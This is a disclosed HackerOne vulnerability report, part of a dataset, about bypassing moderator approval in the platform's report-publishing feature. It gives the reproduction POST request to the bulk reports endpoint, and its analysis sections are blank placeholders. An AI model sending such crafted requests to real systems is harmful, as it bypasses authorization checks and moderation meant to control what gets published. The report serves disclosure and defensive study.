---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '452959'
original_report_id: '452959'
title: A user can bypass approval step in Hacker Publishing feature, allowing them
  to publish reports immediately
weakness: Incorrect Authorization
team_handle: security
created_at: '2018-11-30T04:06:36.539Z'
disclosed_at: '2018-12-05T04:55:40.392Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 88
tags:
- hackerone
- incorrect-authorization
---

# A user can bypass approval step in Hacker Publishing feature, allowing them to publish reports immediately

## Metadata

- HackerOne Report ID: 452959
- Weakness: Incorrect Authorization
- Program: security
- Disclosed At: 2018-12-05T04:55:40.392Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Hi team
**Description:**
Hacker can request agree-on-going-public publish report
### Steps To Reproduce

1. Create publish report
2. 

https://hackerone.com/reports/bulk
POST
message=&reference=&add_reporter_to_original=false&reply_action=agree-on-going-public&reports_count=1&report_ids%5B%5D=██████████&bounty_currency=USD

███

## Impact

Hacker can request agree-on-going-public publish report
Hacker bypasses the check by the moderator

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
